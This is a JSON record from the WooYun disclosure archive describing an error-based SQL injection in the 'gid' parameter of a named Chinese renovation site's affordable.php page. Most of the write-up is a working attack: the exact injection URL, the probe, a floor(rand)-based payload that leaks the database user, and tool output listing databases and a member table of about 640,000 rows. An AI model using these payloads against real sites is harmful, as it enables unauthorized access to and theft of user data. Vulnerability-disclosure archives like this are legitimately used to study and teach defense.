{"id": 27684, "wybug_id": "wooyun-2015-0124898", "wybug_title": "一起装修网某处SQL报错注入", "wybug_corp": "一起装修网", "wybug_author": "路人甲", "wybug_date": "2015-07-06 18:46", "wybug_open_date": "2015-08-20 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-08-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT一起装修网隶属北京神州一起网络科技有限公司，是全国领先的涵盖装修、建材、家具、家电等家居领域电子商务平台，是广大业主最值得信赖的装修口碑门户。中国建筑装饰协会住宅委员会指定的最具信赖的装修平台。已在北京、上海、天津、武汉、沈阳、西安、成都、杭州、石家庄、济南、郑州、合肥、大连、哈尔滨、长沙、重庆、咸阳等17个省市开设分公司，为全国49个主要大中城市业主提供服务。秉承以用户为中心的服务理念，以 \"这里的天是业主的天\" 为行动纲领，从设计到装修，从建材到施工，从家具到软装，为广大业主打造省心、省力、省钱的一站式装修交易互动平台。 详细说明：  这个站用的UCenter系统，但是这个注入出现在在affordable.php中，应该是建站的时候自己添加的。。。注入地址：\nhttp://tuan.17house.com/affordable.php?gid=1831参数gid存在注入\n手工探测，加入'\nhttp://tuan.17house.com/affordable.php?gid=1831'\n\n\n直接报错\nUCenter info: MySQL Query ErrorSQL: select * from `sop_data_affordable_settings` where `venues_main_id` = 1831'Error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1Errno:1064\n接下来直接拿出报错语句，提交\nhttp://tuan.17house.com/affordable.php?gid=1831 and (select 1 from  (select count(*),concat(user(),floor(rand(0)*2))x from  information_schema.tables group by x)a);\n\n\n\nUCenter info: MySQL Query ErrorSQL: select * from `sop_data_affordable_settings` where `venues_main_id` = 1831 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);Error:Duplicate entry 'nouser@192.168.1.2231' for key 'group_key'Errno:1062\n试了各种语句，发现没有WAF这个站应该会有点有不少用户，那就直接上工具跑\n\n跑出数据库：\navailable databases [4]:[*] information_schema[*] salary17up[*] test[*] ultrax\n表非常多。。。810张表。。。\n\n再贴出一个数据量证明：\n| pre_ucenter_members                        | 640124  |\n\n\n看看字段：\n\n从字段看，应该影响不小声明：检测到此结束。。。无破坏活动。。。   漏洞证明：  见详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}